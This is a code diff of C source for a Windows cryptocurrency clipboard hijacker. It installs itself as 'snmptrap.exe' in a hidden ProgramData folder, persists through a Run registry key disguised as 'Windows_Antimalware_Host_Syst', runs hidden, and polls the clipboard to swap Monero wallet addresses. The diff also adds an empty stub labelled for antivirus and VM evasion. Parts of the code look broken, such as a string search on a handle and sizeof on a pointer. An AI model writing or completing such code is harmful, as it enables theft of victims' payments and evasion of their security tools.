@@ -8,6 +8,11 @@
 
 #pragma comment (lib, "shlwapi.lib")
 
+char* _monero_poloniex()
+{
+	return "test";
+}
+
 /*
 	Check file is exist
 */
@@ -66,13 +71,26 @@ void ChangeClipboard(wchar_t*str, int n)
 }
 
 /*
+	Registry
+*/
+void RegAdd()
+{
+	HKEY hkey;
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+	RegSetValueEx(hkey, "Windows_Antimalware_Host_Syst", 0, REG_SZ, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", 70);
+	RegCloseKey(hkey);
+}
+
+/*
 	General Thread
 */
 void Mnemosyne()
 {
 	HANDLE clip;
-	char* monero_poloniex = "you pidor";
 	char* pch;
+	
+	RegAdd();
 
 	while (TRUE)
 	{
@@ -81,12 +99,11 @@ void Mnemosyne()
 			CloseClipboard();
 		}
 
-		// 4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk monero poloniex
-		pch = strstr(monero_poloniex, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk");
+		pch = strstr(clip, "4JUdGzvrMFDWrUUwY3toJATSeNwjn54Lk"); // monero poloniex
 
-		if (!pch)
+		if (pch)
 		{
-			ChangeClipboard(monero_poloniex, sizeof(monero_poloniex));
+			ChangeClipboard(_monero_poloniex(), sizeof(_monero_poloniex()));
 		}
 
 		Sleep(1000);
@@ -99,18 +116,21 @@ void Mnemosyne()
 void Install()
 {
 	char thisExe[MAX_PATH] = "";
-	HKEY hkey;
 
 	CreateDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}", NULL);
 	GetModuleFileName(NULL, thisExe, MAX_PATH);
 	CopyFile(thisExe, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", TRUE);
 
-	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
-	RegSetValueEx(hkey, "Windows_Antimalware_Host_Syst", 0, REG_SZ, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", 70);
-	RegCloseKey(hkey);
-
 	SetCurrentDirectory("C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}");
 	ShellExecute(NULL, 0, "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe", "", 0, SW_HIDE);
+}
+
+/*
+	Check AV and VM
+*/
+void Protection()
+{
+
 }
 
 /*
@@ -122,6 +142,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		if (strcmp(GetFullPathFromProcId(GetCurrentProcessId()), "C:\\ProgramData\\{95B4F0ED-951F-4D36-B068-5EC1C4C19C14}\\snmptrap.exe") == 0)
 		{
+			Protection();
 			Mnemosyne();
 		}
 		else
